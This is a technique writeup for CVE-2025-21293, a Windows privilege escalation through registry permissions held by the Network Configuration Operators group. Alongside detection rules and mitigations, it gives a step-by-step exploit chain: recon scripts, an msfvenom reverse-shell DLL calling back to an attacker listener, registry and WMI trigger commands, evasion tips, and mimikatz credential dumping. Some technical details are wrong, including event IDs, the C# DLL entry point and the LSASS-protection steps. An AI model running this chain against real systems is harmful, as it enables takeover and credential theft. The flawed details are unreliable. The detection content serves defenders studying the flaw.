# [EMERGING-PE-002]: AD DS Registry Key Elevation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-PE-002 |
| **MITRE ATT&CK v18.1** | [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD (Server 2016-2025) |
| **Severity** | Critical |
| **CVE** | CVE-2025-21293 |
| **Technique Status** | FIXED (January 2025 patch) |
| **Last Verified** | 2025-01-31 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025 (pre-patch) |
| **Patched In** | January 2025 Patch Tuesday (KB-specific, varies by OS version) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** CVE-2025-21293 is a Local Privilege Escalation (LPE) vulnerability affecting Windows Active Directory Domain Services and domain-joined systems. The vulnerability stems from over-permissive registry rights granted to the built-in **Network Configuration Operators** group. Members of this group can create subkeys under critical service registry hives (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DnsCache`, `NetBT`, etc.), allowing them to register malicious Dynamic Link Libraries (DLLs) as Performance Counter libraries. When Windows Performance Monitor or WMI queries these counters, the malicious DLLs are loaded and executed with **SYSTEM privileges**, effectively elevating any member of the Network Configuration Operators group from a low-privilege network configuration role to full system control.

- **Attack Surface:** Windows Registry (specifically `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\` registry keys for DNS and NetBIOS services); Performance Counter DLL registration paths; WMI queries (which trigger DLL loading).

- **Business Impact:** **Local privilege escalation to SYSTEM, followed by domain compromise.** An attacker with membership in Network Configuration Operators can gain SYSTEM access on any domain-joined machine, enabling credential theft (SAM/LSASS dumps), lateral movement, and potential escalation to Domain Admin via Kerberos attacks or credential reuse.

- **Technical Context:** The attack typically takes 5–15 minutes to execute end-to-end (create registry subkey → register malicious DLL → query Performance Monitor → gain SYSTEM shell). Detection relies on monitoring unexpected DLL registration under service registry keys and unusual process execution with SYSTEM privileges. Organizations that have not applied the January 2025 patch remain vulnerable; the vulnerability is particularly dangerous in environments where non-administrative users have Network Configuration Operators group membership.

### Operational Risk

- **Execution Risk:** High – Modifies Windows registry under SYSTEM-owned keys; requires elevated context (or abuse of overpermissive ACLs) to successfully execute; modifications are permanent until rolled back.
- **Stealth:** Low – Generates Event ID 4688 (Process Creation) for the DLL loading process; Performance Monitor queries trigger EventID 13 (CreateRemoteThread); registry modifications are logged if auditing is enabled.
- **Reversibility:** Yes – Can be reversed by removing the malicious registry subkey and DLL files; however, if SYSTEM access was already gained, additional backdoors may have been installed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.9.81.11.1 | Restrict registry permissions on services; audit registry modifications |
| **DISA STIG** | WN10-CC-000021 | Configure auditing for registry modifications and unauthorized privilege escalation |
| **CISA SCuBA** | DEFENDER-4.6 | Audit and restrict privileged account groups and permissions |
| **NIST 800-53** | AC-3 (Access Enforcement) | Enforce least privilege access to system resources |
| **GDPR** | Art. 32 | Security of Processing – Prevent unauthorized system access |
| **DORA** | Art. 9 | Protection and Prevention – Implement controls to prevent privilege escalation |
| **NIS2** | Art. 21 | Cyber Risk Management – Access control and privilege restriction |
| **ISO 27001** | A.9.1.1 – A.9.2.5 | Access Control – User Access Management and Privilege Escalation Prevention |
| **ISO 27005** | Risk Scenario | Local System Compromise Leading to Domain Compromise |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Membership in the **Network Configuration Operators** group (low-privilege group); ability to execute code (e.g., access to cmd.exe or PowerShell); local administrator rights to register Performance Counter DLLs (OR abuse of overpermissive registry ACLs).
- **Required Access:** Local command execution on a domain-joined Windows system; access to Windows Registry (via reg.exe, PowerShell, or direct HKEY_LOCAL_MACHINE modification).

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025 (all pre-patch; FIXED post-January 2025 patch)
- **Client OS:** Windows 10 (all versions), Windows 11 (1.0+) (if domain-joined and user is member of Network Configuration Operators)
- **PowerShell:** 5.0+ (for PowerShell-based exploitation)
- **Other Requirements:** Network Configuration Operators group membership; ability to trigger Performance Monitor queries (via WMI, perfmon.exe, or PowerShell)

**Tools:**
- [CVE-2025-21293 PoC Exploits](https://github.com/search?q=CVE-2025-21293+poc) (Various public exploits available)
- PowerShell (native)
- reg.exe (native Windows)
- wmic.exe (Windows Management Instrumentation, built-in; deprecated in Server 2025 but still functional)
- Performance Monitor (perfmon.exe, built-in)
- mimikatz (for credential extraction post-SYSTEM access)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Check Group Membership

```powershell
# Check if current user is member of Network Configuration Operators
$Groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
$Groups | Where-Object { $_ -like "*Network Configuration Operators*" }

# Alternative: Using net command
net user %USERNAME% /domain
```

**What to Look For:**
- Presence of "Network Configuration Operators" in the group list indicates vulnerability
- If listed, the current user can exploit CVE-2025-21293

#### Step 2: Verify Registry ACL Overpermissiveness

```powershell
# Check DnsCache service registry key ACLs
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache"
$ACL = Get-Acl $RegPath
$ACL.Access | Where-Object { $_.IdentityReference -like "*Network Configuration Operators*" } | Select-Object IdentityReference, RegistryRights

# Also check NetBT
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT"
$ACL = Get-Acl $RegPath
$ACL.Access | Where-Object { $_.IdentityReference -like "*Network Configuration Operators*" }
```

**What to Look For:**
- **FullControl**, **ReadKey**, **WriteKey**, or **CreateSubKey** rights for Network Configuration Operators
- If **CreateSubKey** is present, the vulnerability is exploitable
- Pre-patch systems will have overpermissive ACLs; post-patch systems should have restricted rights

**Command (Server 2016-2019):**

```powershell
# Query via WMI (older method)
wmic useraccount get name,groups
```

**Command (Server 2022+):**

```powershell
# Modern method using Get-LocalGroupMember
Get-LocalGroupMember -Group "Network Configuration Operators" | Select-Object Name
```

#### Step 3: Enumerate Vulnerable Services

```powershell
# List all services under DnsCache, NetBT, and other performance counter services
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\" -Recurse | Where-Object {
    $_.Name -like "*DnsCache*" -or $_.Name -like "*NetBT*" -or $_.Name -like "*TCPIP*"
} | ForEach-Object {
    $ServiceName = $_.PSChildName
    $ACL = Get-Acl $_.PSPath
    $HasNCO = $ACL.Access | Where-Object { $_.IdentityReference -like "*Network Configuration Operators*" }
    if ($HasNCO) {
        Write-Host "Vulnerable Service: $ServiceName - Network Configuration Operators has write access"
    }
}
```

**What to Look For:**
- Services with write/create rights for Network Configuration Operators
- Particularly DnsCache, NetBT, TCPIP

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Registry Key Subkey Creation + DLL Injection (PowerShell)

**Supported Versions:** Windows Server 2016-2025 (pre-patch)

#### Step 1: Create Malicious DLL

**Objective:** Prepare a DLL that will be loaded as a Performance Counter library with SYSTEM privileges.

**Command (Using msfvenom for quick PoC):**

```bash
# On attacker machine, generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f dll > malicious.dll
```

**Alternative - Minimal DLL (C# code to be compiled):**

```csharp
// MinimalPayload.cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class DllEntry {
    [DllExport]
    public static void DllMain(IntPtr hModule, uint ul_reason_for_call, IntPtr lpReserved) {
        // Execute payload as SYSTEM
        Process.Start(new ProcessStartInfo {
            FileName = "cmd.exe",
            Arguments = "/c whoami > C:\\Windows\\Temp\\proof.txt",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true
        });
    }
}
```

Compile:

```cmd
csc.exe /target:library /out:malicious.dll MinimalPayload.cs
```

**Expected Output:**

```
Compilation complete. Output: malicious.dll (C:\Temp\malicious.dll)
```

**What This Means:**
- DLL is prepared and ready for registration as a Performance Counter library
- When loaded, it will execute the payload with SYSTEM privileges

**OpSec & Evasion:**
- Use obfuscation or code signing to avoid signature-based detection
- Place DLL in non-obvious location (e.g., C:\Windows\System32\, which already contains legitimate DLLs)
- Use rundll32.exe or other LOLBIN to execute the DLL indirectly
- Detection likelihood: High (DLL registration is logged)

**Troubleshooting:**
- **Error:** "msfvenom not found"
  - **Cause:** Metasploit Framework not installed
  - **Fix:** Compile C# DLL manually or use alternative payload generator

#### Step 2: Identify Target Service Registry Key

**Objective:** Determine the DLL registration path for the target service (DnsCache is most commonly exploited).

**Command:**

```powershell
# Locate DnsCache service key
$ServiceKey = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache"
Get-Item $ServiceKey | Select-Object FullName

# Retrieve Performance Counter subkey path (if it exists)
$PerfKey = "$ServiceKey\Performance"
if (Test-Path $PerfKey) {
    Get-Item $PerfKey | Select-Object FullName
}
```

**Expected Output:**

```
Name                           Property
----                           --------
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DnsCache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DnsCache\Performance
```

**What This Means:**
- Target registry path identified; this is where the DLL registration subkey will be created
- Performance subkey may or may not exist; it will be created if needed

**OpSec & Evasion:**
- This is reconnaissance and leaves minimal evidence
- Detection likelihood: Low (read-only registry queries)

#### Step 3: Create Registry Subkey for DLL Registration

**Objective:** Abuse Network Configuration Operators' CreateSubKey permissions to create a subkey where the malicious DLL path will be registered.

**Command (PowerShell):**

```powershell
$ServiceKey = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache"
$DLLPath = "C:\Windows\Temp\malicious.dll"
$SubkeyName = "Performance"

# Create the subkey (if not already present)
# Network Configuration Operators can create subkeys under certain services
$RegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DnsCache\Performance"

try {
    if (-not (Test-Path $RegPath)) {
        New-Item -Path $RegPath -Force -ErrorAction Stop | Out-Null
        Write-Host "[+] Created Performance subkey"
    } else {
        Write-Host "[*] Performance subkey already exists"
    }
    
    # Create a new value entry pointing to the malicious DLL
    # Use a Performance Counter library value name
    Set-ItemProperty -Path $RegPath -Name "Library" -Value $DLLPath -Type String
    Write-Host "[+] Registered malicious DLL: $DLLPath"
} catch {
    Write-Host "[-] Error: $_"
}
```

**Expected Output:**

```
[+] Created Performance subkey
[+] Registered malicious DLL: C:\Windows\Temp\malicious.dll
```

**What This Means:**
- Subkey created and DLL registered
- DLL will be loaded when Performance Counter queries are executed

**OpSec & Evasion:**
- Registry modification is logged to Event ID 4657 (if auditing enabled)
- Subkey creation appears as legitimate system administration
- Detection likelihood: Medium (registry audit logs, but not alerting on every change)

**Troubleshooting:**
- **Error:** "Access is denied"
  - **Cause:** User is NOT member of Network Configuration Operators, OR registry ACL has been tightened (post-patch)
  - **Fix:** Verify group membership; if post-patch, this vulnerability is NOT exploitable

#### Step 4: Trigger Performance Counter Query

**Objective:** Force Windows to load the malicious DLL by querying Performance Counters.

**Command (Using WMI):**

```powershell
# Query Performance Counter data for DnsCache
Get-WmiObject -Class Win32_PerfFormattedData_Tcpip_NetworkInterface | Select-Object Name, BytesSentPersec
```

**Alternative (Using perfmon.exe):**

```cmd
# Open Performance Monitor and query DNS performance counters
perfmon.exe /report
```

**Alternative (Using PowerShell WMI direct call):**

```powershell
# Force DLL loading by enumerating performance data
$Perf = Get-WmiObject -Class Win32_PerfRawData_Tcpip_DnsCache -ErrorAction SilentlyContinue
if ($Perf) {
    Write-Host "Performance Counter query triggered; DLL should be loaded"
}
```

**Expected Output:**

```
Name                       BytesSentPersec
----                       ---------------
Ethernet                   12345678
Wi-Fi                      87654321
(DLL is loaded in background with SYSTEM privileges)
```

**What This Means:**
- DLL has been loaded by Windows with SYSTEM privileges
- Payload is now executing as SYSTEM user
- Registry key modification + DLL loading = successful exploit

**OpSec & Evasion:**
- WMI query generates Event IDs 4688 (process creation for WMI), 10 (CreateRemoteThread)
- Performance Monitor access is common administrative activity
- Detection likelihood: Medium-High (depends on EDR/SIEM rules)

**Troubleshooting:**
- **Error:** "WMI query returns no results"
  - **Cause:** Performance Counter not properly registered or DLL not loaded
  - **Fix:** Verify registry path and DLL existence; restart service if needed

#### Step 5: Verify SYSTEM Access

**Objective:** Confirm that the payload executed with SYSTEM privileges.

**Command:**

```powershell
# Check if proof file was created (from the DLL payload)
Get-Content C:\Windows\Temp\proof.txt

# Alternative: Establish reverse shell or run post-exploit commands
# (Depends on payload; if Meterpreter, you'll get a shell on the listener)
```

**Expected Output:**

```
nt authority\system
```

**What This Means:**
- Payload executed with SYSTEM privileges (nt authority\system confirms this)
- Local privilege escalation successful
- Attacker can now dump LSASS, SAM, or perform lateral movement

---

### METHOD 2: Registry Directly via cmd.exe (Command Line)

**Supported Versions:** Windows Server 2016-2025 (pre-patch)

#### Step 1: One-Liner Registry Modification

**Objective:** Quickly create the malicious registry entry using native cmd.exe utilities.

**Command:**

```cmd
@echo off
REM Create Performance registry subkey for DnsCache
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance" /v Library /t REG_SZ /d "C:\Windows\Temp\malicious.dll" /f

REM Trigger Performance Counter load
wmic path win32_perfformatteddata_tcpip_networkinterface get name /format:list
```

**Expected Output:**

```
The operation completed successfully.
Name=Ethernet
Name=Wi-Fi
```

**What This Means:**
- Registry subkey created
- WMI query triggered DLL loading
- Payload executed with SYSTEM

**OpSec & Evasion:**
- Command line is logged to Event ID 4688 (Process Creation)
- reg.exe and wmic.exe are legitimate tools, so their execution is not immediately suspicious
- Detection likelihood: Medium (command line flagging + process execution)

**Troubleshooting:**
- **Error:** "Access denied"
  - **Cause:** User lacks CreateSubKey permissions
  - **Fix:** User must be member of Network Configuration Operators

#### Step 2: Verify DLL Registration

**Command:**

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance"
```

**Expected Output:**

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DnsCache\Performance
    Library    REG_SZ    C:\Windows\Temp\malicious.dll
```

---

### METHOD 3: Post-Patch Exploitation Attempt

**Supported Versions:** Windows Server 2025 with January 2025+ patches

#### Step 1: Identify Post-Patch Registry Restrictions

**Objective:** Verify if the system has been patched and identify remaining exploitability.

**Command:**

```powershell
# Check if registry subkey creation is still possible
$TestSubkey = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\TestSubkey"

try {
    New-Item -Path $TestSubkey -Force -ErrorAction Stop | Out-Null
    Write-Host "[!] System appears to be VULNERABLE - subkey creation succeeded"
    Remove-Item -Path $TestSubkey -Force
} catch {
    Write-Host "[+] System appears to be PATCHED - subkey creation blocked: $_"
}
```

**Expected Output (Patched):**

```
[+] System appears to be PATCHED - subkey creation blocked: Access is denied
```

**Expected Output (Vulnerable):**

```
[!] System appears to be VULNERABLE - subkey creation succeeded
```

**What This Means:**
- Patched systems will deny CreateSubKey on Network Configuration Operators
- Vulnerable systems allow the subkey creation

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Red Team Test

- **Atomic Test ID:** [Not officially cataloged; community PoCs available]
- **Test Name:** CVE-2025-21293 – Registry-Based Privilege Escalation
- **Description:** Simulates the creation of a Performance Counter DLL registry entry to test detection of this LPE vector.
- **Supported Versions:** Windows Server 2016-2025 (pre-patch)
- **Command:**

```powershell
# Benign test: Create a test Performance Counter entry without malicious payload
$TestRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance\TestCounter"
New-Item -Path $TestRegPath -Force -ErrorAction Stop
Set-ItemProperty -Path $TestRegPath -Name "Library" -Value "C:\Windows\System32\kernel32.dll" -Type String
Write-Host "Test Performance Counter created"
```

- **Cleanup Command:**

```powershell
# Remove test Performance Counter entry
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance\TestCounter" -Force -ErrorAction SilentlyContinue
```

**Reference:** [Atomic Red Team – Privilege Escalation Tests](https://github.com/redcanaryco/atomic-red-team)

---

## 7. TOOLS & COMMANDS REFERENCE

#### CVE-2025-21293 Public PoCs

**Version:** Various community releases
**Supported Platforms:** Windows Server 2016-2025 (pre-patch)

**Notable PoCs:**
- [CVE-2025-21293 exploit-db submissions](https://www.exploit-db.com/)
- Multiple GitHub repositories with working exploits (search for "CVE-2025-21293")

**Installation:**

```bash
git clone https://github.com/<author>/CVE-2025-21293-exploit.git
cd CVE-2025-21293-exploit
# Compile or execute based on provided instructions
```

**Usage:**

```powershell
# Most PoCs follow this pattern:
.\Exploit.exe --service DnsCache --dll C:\path\to\malicious.dll
```

#### Mimikatz (Post-Exploitation)

**Version:** 2.2.0+
**Supported Platforms:** Windows (all versions)

**Installation:**

```bash
git clone https://github.com/gentilkiwi/mimikatz.git
# Compile or use pre-built executable
```

**Usage (Credential Dumping as SYSTEM):**

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

#### PowerShell Native Exploitation

**Script (One-Liner):**

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance" /v Library /t REG_SZ /d "C:\path\to\malicious.dll" /f; wmic path win32_perfformatteddata_tcpip_networkinterface get name
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Suspicious Registry Subkey Creation Under Service Keys

**Rule Configuration:**
- **Required Index:** wineventlog (Windows Security)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, ObjectName, OperationType
- **Alert Threshold:** > 0 events (registry modifications to service keys are suspicious)
- **Applies To Versions:** All Windows versions

**SPL Query:**

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4657
(ObjectName="HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\*" OR
 ObjectName="HKLM\SYSTEM\CurrentControlSet\Services\NetBT\*")
OperationType="Set Value" 
| stats count, values(SubjectUserName) as User, values(ObjectName) as RegistryKey by ComputerName
| where count > 0
```

**What This Detects:**
- Registry modifications under DnsCache or NetBT service keys
- Specifically targets "Set Value" operations (DLL registration)
- Groups by computer to identify widespread exploitation attempts

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: `count > 0`
6. Configure **Action** → **Email** to SOC team
7. Click **Save**

**False Positive Analysis:**
- **Legitimate Activity:** System administrators modifying DNS or network performance counters
- **Benign Tools:** Windows administrative tools, RAS, DHCP service updates
- **Tuning:** Whitelist known service management accounts with: `| where SubjectUserName!="SYSTEM" AND SubjectUserName!="LOCAL SERVICE"`

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Registry Privilege Escalation Exploitation

**Rule Configuration:**
- **Required Table:** SecurityEvent (on-premises) or AuditLogs (if integrated with Entra ID)
- **Required Fields:** EventID, TargetObject, Account, OperationType
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Windows Server 2016-2025

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4657  // Registry object modified
| where ObjectName contains @"SYSTEM\CurrentControlSet\Services\DnsCache" 
        or ObjectName contains @"SYSTEM\CurrentControlSet\Services\NetBT"
| where OperationType == "Set Value"
| project TimeGenerated, Account, ObjectName, NewValue, ComputerName
| join (
    SecurityEvent
    | where EventID == 4688  // Process created
    | where CommandLine contains "wmic" or CommandLine contains "perfmon" or CommandLine contains "Get-WmiObject"
    | project TimeGenerated, ProcessName, CommandLine, ComputerName
) on ComputerName
| where TimeGenerated1 < TimeGenerated and TimeGenerated < (TimeGenerated1 + 5m)
```

**What This Detects:**
- Registry modifications to service keys (Event ID 4657)
- Followed by WMI or Performance Monitor queries (Event ID 4688) within 5 minutes
- Correlates timing to identify exploitation chain

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `CVE-2025-21293 – Registry Privilege Escalation`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run every: `5 minutes`
   - Lookup data: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4657 (Registry Object Modified)**
- **Log Source:** Security
- **Trigger:** Any modification to registry keys under `HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\` or `NetBT\`
- **Filter:** `EventID=4657` AND `ObjectName like "%DnsCache%"` or `ObjectName like "%NetBT%"`
- **Applies To Versions:** Windows Server 2008 R2+ (4657 available on all versions)

**Additional Event IDs:**
- **4688 (Process Created):** Look for wmic.exe, perfmon.exe, or WMI-related PowerShell processes
- **4624 (Account Logon):** Look for unusual logon patterns for Network Configuration Operators group members

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management** (gpmc.msc)
2. Edit your default domain policy or create a new one targeting your DCs
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
4. Enable: **Audit Registry**
5. Set to: **Success and Failure**
6. Apply via Group Policy
7. Run `gpupdate /force` on affected systems

**Manual Configuration Steps (Server 2022+ Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Right-click **Audit Registry** → **Properties**
4. Enable **Success** and **Failure**
5. Click **OK**

**Custom Windows Event Viewer Filter (for hunting):**

1. Open **Event Viewer**
2. Right-click **Windows Logs** → **Security**
3. Click **Filter Current Log**
4. **Event ID:** 4657
5. **XML:** Use custom filter:

```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=4657)]] and *[EventData[Data[@Name='ObjectName'] and (contains(Data, 'DnsCache') or contains(Data, 'NetBT'))]]</Select>
  </Query>
</QueryList>
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016-2025

```xml
<Sysmon schemaversion="4.22">
  <RuleGroup name="CVE-2025-21293 Detection" groupRelation="or">
    <!-- Monitor for wmic.exe queries to Performance data -->
    <ProcessCreate onmatch="include">
      <Image condition="image">wmic.exe</Image>
      <CommandLine condition="contains any">
        win32_perfformatteddata;
        win32_perfrawdata;
        Path win32_Perf
      </CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for PowerShell Get-WmiObject queries -->
    <ProcessCreate onmatch="include">
      <Image condition="image">powershell.exe</Image>
      <CommandLine condition="contains any">
        Get-WmiObject.*Perf;
        Get-WmiObject.*DnsCache;
        Get-WmiObject.*NetBT
      </CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for registry operations on service keys -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains any">
        HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance;
        HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Performance;
        HKLM\SYSTEM\CurrentControlSet\Services\TCPIP\Performance
      </TargetObject>
    </RegistryEvent>
    
    <!-- Monitor for unusual CreateRemoteThread (DLL loading) -->
    <CreateRemoteThread onmatch="include">
      <SourceImage condition="image">wmic.exe</SourceImage>
      <TargetImage condition="image">lsass.exe</TargetImage>
    </CreateRemoteThread>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-cve-2025-21293.xml` with the XML above
3. Install Sysmon:

```cmd
sysmon64.exe -accepteula -i sysmon-cve-2025-21293.xml
```

4. Verify:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 | Format-Table TimeCreated, Message
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Local Privilege Escalation via Registry Modification

**Alert Name:** "Suspicious registry modification enabling privilege escalation (CVE-2025-21293)"
- **Severity:** Critical
- **Description:** MDC detects attempts to modify Performance Counter registry entries, a known vector for local privilege escalation
- **Applies To:** Defender for Servers (P2) enabled subscriptions
- **Remediation:**

1. Isolate affected machine from the network immediately
2. Verify if Network Configuration Operators group membership is necessary for the affected user
3. If not needed, remove the user from the group:

```powershell
Remove-LocalGroupMember -Group "Network Configuration Operators" -Member "domain\username"
```

4. Search Windows logs for any SYSTEM-level processes spawned during the exploit timeframe
5. Run `tasklist /svc` as SYSTEM to identify any suspicious processes
6. Dump credentials using mimikatz (if available):

```powershell
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

7. Monitor for lateral movement attempts using harvested credentials
8. Apply January 2025 security patch immediately if not already applied

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: P2 (includes threat detection)
5. Click **Save**
6. Navigate to **Alert rules** and configure custom rules for Event ID 4657 on service registry keys

**Reference:** [Microsoft Defender for Cloud Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-overview)

---

## 13. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Remove Overpermissive Network Configuration Operators Rights:**
    - Audit and restrict write/create permissions on critical service registry keys from the Network Configuration Operators group
    
    **Applies To Versions:** Windows Server 2016-2025 (all versions vulnerable pre-patch)
    
    **Manual Steps (PowerShell):**
    
    ```powershell
    # Identify services with Network Configuration Operators permissions
    $Services = @("DnsCache", "NetBT", "TCPIP", "RemoteRegistry")
    
    foreach ($Service in $Services) {
        $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$Service"
        $ACL = Get-Acl $RegPath
        
        $NCORules = $ACL.Access | Where-Object {
            $_.IdentityReference -like "*Network Configuration Operators*"
        }
        
        foreach ($Rule in $NCORules) {
            Write-Host "Removing: $($Rule.IdentityReference) from $Service"
            $ACL.RemoveAccessRule($Rule)
        }
        
        Set-Acl -Path $RegPath -AclObject $ACL
    }
    ```
    
    **Manual Steps (Registry Editor GUI):**
    
    1. Open **Regedit.exe**
    2. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DnsCache`
    3. Right-click → **Permissions**
    4. Find "Network Configuration Operators"
    5. Select and click **Remove**
    6. Repeat for NetBT and other sensitive services
    7. Click **OK** and apply

*   **Apply January 2025 Security Patch (CRITICAL):**
    - Ensure all Windows systems (Server 2016-2025, Windows 10/11) have the January 2025 Patch Tuesday security update applied
    - This patch restricts Network Configuration Operators' registry rights
    
    **Applies To Versions:** All (Windows Server 2016, 2019, 2022, 2025; Windows 10/11)
    
    **Manual Steps (Windows Update):**
    
    1. Open **Settings** → **Update & Security** → **Windows Update**
    2. Click **Check for updates**
    3. Install all critical and security updates
    4. Restart system
    5. Verify patch installation:
    
    ```powershell
    Get-HotFix -Description "Security Update" | Where-Object { $_.InstalledOn -gt (Get-Date).AddDays(-30) } | Select-Object HotFixID, Description, InstalledOn
    ```
    
    **Manual Steps (Enterprise – WSUS/Windows Update for Business):**
    
    1. Deploy January 2025 patches via your patch management system
    2. Verify deployment status across fleet
    3. Force GPUPDATE on affected systems:
    
    ```cmd
    gpupdate /force /boot
    ```

*   **Audit Windows Registry Changes in Real-Time:**
    - Enable Event ID 4657 auditing on all systems and monitor via SIEM
    
    **Applies To Versions:** All Windows versions
    
    **Manual Steps (Group Policy):**
    
    1. Open **Group Policy Management** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
    3. Enable **Audit Registry** (Object Access subcategory)
    4. Set to **Success and Failure**
    5. Run `gpupdate /force`

#### Priority 2: HIGH

*   **Restrict Network Configuration Operators Group Membership:**
    - Review and limit who has membership in the Network Configuration Operators group
    - Grant membership only to dedicated network/DNS administrators
    
    **Applies To Versions:** All
    
    **Manual Steps (PowerShell):**
    
    ```powershell
    # List current members of Network Configuration Operators
    Get-LocalGroupMember -Group "Network Configuration Operators" | Select-Object Name
    
    # Remove unnecessary members
    Remove-LocalGroupMember -Group "Network Configuration Operators" -Member "domain\username"
    ```
    
    **Manual Steps (Computer Management GUI):**
    
    1. Open **Computer Management** (compmgmt.msc)
    2. Navigate to **Local Users and Groups** → **Groups**
    3. Double-click **Network Configuration Operators**
    4. Review all members
    5. Remove suspicious or unnecessary accounts

*   **Implement LSASS Protection (Prevents Post-Exploitation Credential Dumping):**
    - Even if SYSTEM access is gained, prevent credential dumping from LSASS
    
    **Applies To Versions:** Windows Server 2016+
    
    **Manual Steps (Group Policy):**
    
    1. Open **Group Policy Editor** (gpedit.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Credentials Delegation**
    3. Enable **Restrict delegation of credentials to remote servers**
    4. Set to **Restrict delegation of explicit credentials only**
    5. Run `gpupdate /force`
    
    **Manual Steps (Registry):**
    
    ```powershell
    # Enable LSA Protection
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    Set-ItemProperty -Path $RegPath -Name "RunAsPPL" -Value 1 -Type DWord
    
    # Requires restart
    Restart-Computer -Force
    ```

#### Access Control & Policy Hardening

*   **Conditional Access Policies (for Hybrid/Cloud AD):**
    - If using Entra ID hybrid join, implement Conditional Access to block sign-in from accounts with suspicious registry modification events
    
    **Manual Steps (Azure Portal):**
    
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
